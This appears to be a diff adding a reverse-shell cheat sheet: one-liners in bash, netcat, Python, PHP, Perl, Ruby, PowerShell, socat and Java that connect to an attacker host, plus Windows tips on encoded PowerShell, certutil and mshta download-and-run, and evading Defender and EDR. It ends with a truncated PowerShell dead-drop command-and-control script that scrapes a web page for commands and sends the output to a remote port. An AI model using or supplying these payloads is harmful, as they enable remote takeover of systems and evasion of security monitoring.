@@ -1,0 +1,116 @@
+1. Bash Reverse Shell
+bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+
+2. Netcat (traditional)
+nc ATTACKER_IP PORT -e /bin/bash
+
+3. Netcat (no -e option)
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
+
+4. Python Reverse Shell
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+5. PHP Reverse Shell
+php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+6. Perl Reverse Shell
+perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+7. Ruby Reverse Shell
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER_IP","PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+8. PowerShell Reverse Shell (Windows)
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
+
+9. Socat Reverse Shell (better TTY)
+socat TCP:ATTACKER_IP:PORT EXEC:/bin/bash
+
+10. Java Reverse Shell
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
+p.waitFor()
+Listener (on your attacker machine)
+
+Most of these need:
+
+nc -lvnp PORT
+
+
+
+
+🔥 1. PowerShell (still the main one — but needs tweaks)
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
+
+👉 Works if:
+
+Defender is relaxed / lab environment
+No strict EDR
+
+⚠️ On modern Windows:
+
+This often gets flagged unless obfuscated
+🔥 2. Encoded PowerShell (more realistic)
+powershell -EncodedCommand <BASE64_PAYLOAD>
+
+👉 Why this works better:
+
+Avoids simple signature detection
+Common in real-world payloads
+
+(You’d encode the previous payload in UTF-16LE → base64)
+
+🔥 3. “Living off the land” (LOLBins) approach
+
+Using built-in binaries like:
+
+certutil -urlcache -split -f http://ATTACKER_IP/shell.ps1 shell.ps1 && powershell -ExecutionPolicy Bypass -File shell.ps1
+
+👉 Why:
+
+Uses trusted Windows tools
+Less suspicious than dropping random binaries
+🔥 4. MSHTA (still surprisingly effective in labs)
+mshta http://ATTACKER_IP/shell.hta
+
+👉 This executes remote script content directly
+Still works in many lab setups / older configs
+
+🔥 5. Socat (Windows build, if available)
+socat TCP:ATTACKER_IP:PORT EXEC:cmd.exe
+
+👉 Rare, but if present:
+
+very clean shell
+🔥 6. Python (if installed on Windows)
+python -c "import socket,subprocess,os;s=socket.socket();s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0);os.dup2(s
+
+7 powershell
+# Configuration
+$url = "http://your-dead-drop-site.com/profile"
+$headers = @{"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+
+try {
+    # 1. More resilient web request
+    $resp = Invoke-WebRequest -Uri $url -Headers $headers -UseBasicParsing -ErrorAction Stop
+    $html = $resp.Content
+
+    # 2. Extracting using a more flexible Regex pattern
+    if ($html -match '(?<=actual_persona_name">)(.*?)(?=</span>)') { $cmd = $matches[0] }
+    if ($html -match '(?<=header_real_name ellipsis">)\s*<bdi>(.*?)</bdi>') { $ip = $matches[1] }
+
+    if ($cmd -and $ip) {
+        # 3. Execution (Using Alias to hide IEX slightly)
+        $output = & (Get-Alias -Name "i*x") $cmd 2>&1 | Out-String
+
+        # 4. Robust TCP Connection
+        $client = New-Object System.Net.Sockets.TcpClient
+        $connect = $client.BeginConnect($ip, 9999, $null, $null)
+        
+        # Wait up to 5 seconds for connection
+        $wait = $connect.AsyncWaitHandle.WaitOne(5000, $false)
+
+        if ($client.Connected) {
+            $stream = $client.GetStream()
+            $writer = New-Object System.Net.Sockets.NetworkStream($stream)
+            $buffer = [System.Text.Encoding]::UTF8.GetBytes($output)
+            $
